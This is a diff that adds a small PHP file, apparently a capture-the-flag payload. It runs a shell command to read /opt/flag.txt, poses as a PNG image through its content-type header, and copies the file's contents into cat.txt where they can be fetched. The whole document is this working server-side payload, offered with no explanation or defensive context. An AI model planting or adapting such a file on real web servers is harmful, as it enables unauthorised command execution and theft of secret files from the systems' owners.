@@ -1,0 +1,8 @@
+<?php
+$tmp = `cat /opt/flag.txt`;
+header("Content-type: image/png");
+$name = "cat.txt";
+$file = fopen($name, "w"); 
+fputs($file, iconv('cp1251', 'utf-8', $tmp));
+fclose ($file); 
+?>
